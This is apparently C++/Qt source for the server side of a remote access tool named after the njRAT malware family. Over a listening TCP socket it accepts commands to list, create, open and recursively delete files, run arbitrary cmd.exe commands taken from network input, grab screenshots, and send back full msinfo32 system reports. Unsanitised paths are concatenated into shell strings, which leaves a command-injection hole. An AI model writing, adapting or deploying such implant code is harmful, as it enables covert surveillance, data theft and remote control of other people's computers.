#include "njratserver.h"
#include <QBuffer>
#include <QFile>
#include <QGuiApplication>
#include <QMessageBox>
#include <QProcess>
#include <QScreen>
#include <QTextStream>
#include <QThread>

NjRatServer::NjRatServer()
{
    state = false;
    logger = nullptr;
}

NjRatServer::~NjRatServer()
{
    if (logger)
        delete logger;
}

void NjRatServer::set_sLogger(QString str)
{
    logger = new sLogger(str);
}

void NjRatServer::startServer(UserList<userInfo, QString>* ul)
{
    userList = ul;

    if (this->listen(QHostAddress::Any, SERVER_PORT))
        //qDebug() << "Listening";
        (*logger) << "Listening";
    else
        //qDebug() << "Not listening";
        (*logger) << "Not listening";
}

void NjRatServer::incomingConnection(int socketDescriptor)
{
    QTcpServer::close();

    socket = new QTcpSocket(this);
    socket->setSocketDescriptor(socketDescriptor);
    state = true;

    connect(socket, SIGNAL(readyRead()), this, SLOT(socketReady()));
    connect(socket, SIGNAL(disconnected()), this, SLOT(socketDisc()));

    //qDebug() << socketDescriptor << " Client connected";
    (*logger) << "Client connected";
}

void NjRatServer::socketReady()
{
    socket->waitForReadyRead(500);
    bufferData = socket->readAll();

    if (bufferData[0] == 'f' &&
        bufferData[2] == 'i' &&
        bufferData[4] == 'l' &&
        bufferData[6] == 'e' &&
        bufferData[8] == 's' &&
        bufferData[10] == 'y' &&
        bufferData[12] == 's')
    {
        wchar_t* ptr = new wchar_t[bufferData.size() / 2];
        for (int i = 0, j = 0; i < bufferData.size() / 2; i++, j++)
        {
            ptr[i] = bufferData[j++];
            ptr[i] += bufferData[j] * 256;
        }
        QString requestString = QString::fromWCharArray(ptr, bufferData.size() / 2);
        delete[] ptr;

        QString filesys;
        for (int i = 8; i < requestString.size(); i++)
            filesys += requestString[i];

        QString operation;
        int i = 0;
        for (; filesys[i] != '$'; i++)
            operation += filesys[i];

        QString sPath;
        i++;
        for (; filesys[i] != '$'; i++)
            sPath += filesys[i];

        if (operation == "enter")
        {
            QDir mDir(sPath);
            if (!mDir.exists())
            {
                QString request = "Error";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
                //qDebug() << requestString;
                (*logger) << requestString;
                return;
            }

            QString request = "filesys:";

            for (QFileInfo tmp : mDir.entryInfoList())
                request += tmp.fileName() + '/';

            socket->write((char*)(request.toStdWString().c_str()), request.size() * 2);   // Отправляем сигнал о завершении операции
            socket->waitForBytesWritten(500);
            //qDebug() << requestString;
            (*logger) << requestString;
            return;
        }
        if (operation == "mkdir")
        {
            QDir mDir;
            if (mDir.mkdir(sPath))
            {
                QString request = "Ok";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
            }
            else
            {
                QString request = "Error";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
            }
            //qDebug() << requestString;
            (*logger) << requestString;
            return;
        }
        if (operation == "mkfile")
        {
            QFile mFile(sPath);
            if (mFile.exists())
            {
                QString request = "Error";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
                //qDebug() << requestString;
                (*logger) << requestString;
                return;
            }
            if (mFile.open(QIODevice::ReadWrite))
            {
                QString request = "Ok";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
                mFile.close();
                //qDebug() << requestString;
                (*logger) << requestString;
                return;
            }
            else
            {
                QString request = "Error";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
                //qDebug() << requestString;
                (*logger) << requestString;
                return;
            }

            return;
        }
        if (operation == "openfile")
        {
            QProcess* process = new QProcess(this);
            QString sysCom = "cmd.exe /C start \"" + sPath + '\"';
            process->start(sysCom);
            QString request = "Ok";
            socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
            socket->waitForBytesWritten(500);
            //qDebug() << requestString;
            (*logger) << requestString;
            return;
        }
        if (operation == "rmdir")
        {
            QDir mDir(sPath);
            if (mDir.removeRecursively())
            {
                QString request = "Ok";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
            }
            else
            {
                QString request = "Error";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
            }

            //qDebug() << requestString;
            (*logger) << requestString;
            return;
        }
        if (operation == "rmfile")
        {
            QDir mDir;
            if (mDir.remove(sPath))
            {
                QString request = "Ok";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
            }
            else
            {
                QString request = "Error";
                socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
                socket->waitForBytesWritten(500);
            }

            //qDebug() << requestString;
            (*logger) << requestString;
            return;
        }

        return;
    }

    QString command;
    for (int i = 0; bufferData[i] != ':'; i++)
        command += bufferData[i];

    if (command == "verification")  // Проверка на наличие такого пользователя в бд
    {
        QString login;
        QString password;
        bool sysInfo = false;

        int i;
        for (i = 13; bufferData[i] != '$'; i++)
            login += bufferData[i];
        i++;
        for (; bufferData[i] != '$'; i++)
            password += bufferData[i];
        i++;
        if (bufferData[i])  // Если требуется передать системную информацию
            sysInfo = true;

        bool isUser = false;
        int uIndex = 0;
        for (; uIndex < userList->get_quantity(); uIndex++)
        {
            if (login == userList->findID(uIndex + 1)->ptr->getName() && password == userList->findID(uIndex + 1)->ptr->getPassword())
            {
                isUser = true;
                break;
            }
        }

        if (!isUser)    // Если такого пользователя нет или пароль не совпадает
        {
            QString request = "Fail";
            socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
            socket->waitForBytesWritten(500);
            //qDebug() << bufferData;
            (*logger) << bufferData;
            return;
        }

        logger->setName(login);
        emit send_user_info(login, userList->findID(uIndex + 1)->ptr_i);

        QString request = "success:0000";

        if (userList->findID(uIndex + 1)->ptr->getPermissions() & 4)
            request[8] = '1';
        if (userList->findID(uIndex + 1)->ptr->getPermissions() & 2)
            request[9] = '1';
        if (userList->findID(uIndex + 1)->ptr->getPermissions() & 1)
            request[10] = '1';

        for (int i = 13; bufferData[i] != '$'; i++)
            request += bufferData[i];
        request += '$';

        if (sysInfo)    // Если требуется передать системную информацию
        {
            QProcess* process = new QProcess(this);
            QString sysCom = QString("cmd.exe %1 \"%2\"").arg("/C").arg("msinfo32 /report C:/NjTmpSysInfo.txt");
            process->start(sysCom);
            if (process->waitForStarted(-1))
                while (process->waitForReadyRead(-1));
            QFile file("C:/NjTmpSysInfo.txt");
            if (file.open(QIODevice::ReadOnly | QFile::Text))
            {
                QTextStream stream(&file);
                QString array = stream.readAll();
                request += array.toStdString().c_str();
                file.flush();
                file.close();
                QFile::remove("C:/NjTmpSysInfo.txt");
            }
        }

        socket->write((char*)(request.toStdWString().c_str()), request.size() * 2);   // Отправляем сигнал об успехе с разрешениями для данного пользователя
        socket->waitForBytesWritten(500);
        //qDebug() << bufferData;
        (*logger) << bufferData;
        return;
    }
    if (command == "message")
    {
        QString message;
        for (int i = 8; bufferData[i] != '$'; i++)
            message += bufferData[i];
        QMessageBox::about(nullptr, "Message", message.toStdString().c_str());
        QString request = "Ok";
        socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
        socket->waitForBytesWritten(500);
        //qDebug() << bufferData;
        (*logger) << bufferData;
        return;
    }
    if (command == "command")
    {
        QString typeCommand;
        int i;
        for (i = 8; bufferData[i] != '$'; i++)
            typeCommand += bufferData[i];

        QString cmd;
        i++;
        for (; bufferData[i] != '$'; i++)
            cmd += bufferData[i];

        if (cmd == "shutdown /s" ||
            cmd == "shutdown /r" ||
            cmd == "rundll32.exe PowrProf.dll,SetSuspendState" ||
            cmd == "rundll32.exe powrprof.dll,SetSuspendState 0,1,0" ||
            cmd == "Rundll32.exe User32.dll,LockWorkStation")
        {
            QString request = "Ok";
            socket->write(request.toStdString().c_str());   // Отправляем сигнал о завершении операции
            socket->waitForBytesWritten(500);
            //qDebug() << bufferData;
            (*logger) << bufferData;
            QThread::sleep(10);
            emit send_start_ui();
        }

        QProcess* process = new QProcess(this);
        QString sysCom = QString("cmd.exe %1 \"%2\"").arg("/C").arg(cmd);
        process->start(sysCom);
        if (process->waitForStarted(-1))
            while (process->waitForReadyRead(-1));

        if (typeCommand == "xmlSysFile")
        {
            QString request = "xmlSysFile:";
            QFile file("C:/NjTmpSysInfo.txt");
            if (file.open(QIODevice::ReadOnly | QFile::Text))
            {
                QTextStream stream(&file);
                QString array = stream.readAll();
                request += array.toStdString().c_str();
                file.flush();
                file.close();
                QFile::remove("C:/NjTmpSysInfo.txt");
            }
            socket->write((char*)(request.toStdWString().c_str()), request.size() * 2);
            socket->waitForBytesWritten(500);
            //qDebug() << bufferData;
            (*logger) << bufferData;
            return;
        }

        if (typeCommand == "file")
        {
            QString request = "operation:";

            if (cmd == "ver > D:/NjTmpSysInfo.txt")
                request += "v$";
            else if (cmd == "time /T > D:/NjTmpSysInfo.txt")
                request += "t$";
            else if (cmd == "date /T > D:/NjTmpSysInfo.txt")
                request += "d$";
            else if (cmd == "tzutil /g > D:/NjTmpSysInfo.txt")
                request += "z$";

            QFile file("D:/NjTmpSysInfo.txt");
            if (file.open(QIODevice::ReadOnly | QFile::Text))
            {
                QTextStream stream(&file);
                QString array = stream.readAll();
                request += array.toStdString().c_str();
                file.flush();
                file.close();
                QFile::remove("D:/NjTmpSysInfo.txt");
            }
            socket->write(request.toStdString().c_str());
            socket->waitForBytesWritten(500);
            //qDebug() << bufferData;
            (*logger) << bufferData;
            return;
        }
        if (typeCommand == "nfile")
        {
            QString request = "Ok";
            socket->write(request.toStdString().c_str());
            socket->waitForBytesWritten(500);
            //qDebug() << bufferData;
            (*logger) << bufferData;
            return;
        }
    }
    if (command == "screen")
    {
         QScreen *screen = QGuiApplication::primaryScreen();
         QPixmap pix = screen->grabWindow(NULL);
         QByteArray bArray;
         QBuffer buffer(&bArray);
         buffer.open(QIODevice::WriteOnly);
         pix.save(&buffer, "PNG");

         QString isSharing;
         for (int i = 7; bufferData[i] != '$'; i++)
             isSharing += bufferData[i];

         if (isSharing.isEmpty())
         {
             QByteArray request = "screen:";
             for (int i = 0; i < bArray.size(); i++)
                 request += bArray[i];

             socket->write(request.toStdString().c_str(), request.size());
             socket->waitForBytesWritten(500);
             //qDebug() << bufferData;
             (*logger) << bufferData;
             return;
         }
         else
         {
             QByteArray request = "screenSharing:";
             for (int i = 0; i < bArray.size(); i++)
                 request += bArray[i];

             socket->write(request.toStdString().c_str(), request.size());
             socket->waitForBytesWritten(50);
             //qDebug() << bufferData;
             (*logger) << bufferData;
             return;
         }
    }
}

void NjRatServer::socketDisc()
{
    //qDebug() << "Disconnected";
    if (logger != nullptr)
    {
        (*logger) << "Disconnected";
        logger->setName("");

        emit waiting_for_connection();

        QTcpServer::listen(QHostAddress::Any, SERVER_PORT);

        socket->deleteLater();
        state = false;
    }
}

void NjRatServer::close()
{
    //qDebug() << "Server closed";
    if (logger)
    {
        (*logger) << "Server closed";
        delete logger;
        logger = nullptr;
    }

    if (state)
        socket->deleteLater();
    QTcpServer::close();
}
